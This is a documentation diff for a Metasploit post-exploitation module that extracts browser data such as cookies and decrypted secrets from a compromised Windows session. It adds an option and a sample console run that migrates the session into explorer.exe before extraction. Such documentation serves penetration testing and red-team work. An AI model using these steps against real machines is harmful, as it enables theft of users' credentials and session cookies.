@@ -78,12 +78,14 @@ This post-exploitation module extracts sensitive browser data from both Chromium
 4. Set the appropriate session ID: `set SESSION <session id>`
 5. (Optional) Enable verbose mode if you want detailed output: `set VERBOSE true`
 6. (Optional) Kill browser processes before extraction to avoid file access issues: `set KILL_BROWSER true`
-7. Run the module: `run`
-8. You should see the extracted browser data in the loot files.
+7. (Optional) Migrate the session to `explorer.exe` before extraction: `set USER_MIGRATION true`
+8. Run the module: `run`
+9. You should see the extracted browser data in the loot files.
 
 ## Options
 
 - **KILL_BROWSER** - Kills browser processes before data extraction. This can help avoid file access issues if the browser is running, particularly for cookies. Default is `false`.
+- **USER_MIGRATION** - Migrates the session to `explorer.exe` (if available) before extracting data. This ensures the module is run in the user's context, avoiding potential access issues for user-specific data. Default is `false`.
 - **VERBOSE** - Prints more detailed output for each step, including encryption key extraction and DPAPI decryption. Default is `false`.
 - **SESSION** - The session to run the module on. Required.
 
@@ -189,6 +191,22 @@ msf6 post(windows/gather/enum_browsers) > run
 ```
 
 This will kill any running browser processes and avoid file access issues.
+
+### Using USER_MIGRATION to Run in User Context
+
+If you want to ensure that the session runs in the user context (e.g., `explorer.exe`) to avoid access issues, enable the `USER_MIGRATION` option:
+
+```bash
+msf6 post(windows/gather/enum_browsers) > set USER_MIGRATION true
+USER_MIGRATION => true
+msf6 post(windows/gather/enum_browsers) > run
+
+[*] Found explorer.exe running with PID: 11520. Attempting migration.
+[+] Successfully migrated to explorer.exe (PID: 11520).
+[*] Targeting: W00T\ah (178.238.175.xxx).
+[*] Starting data extraction from user profile: C:\Users\ah
+...
+```
 
 ### Using VERBOSE Mode for Detailed Output
 
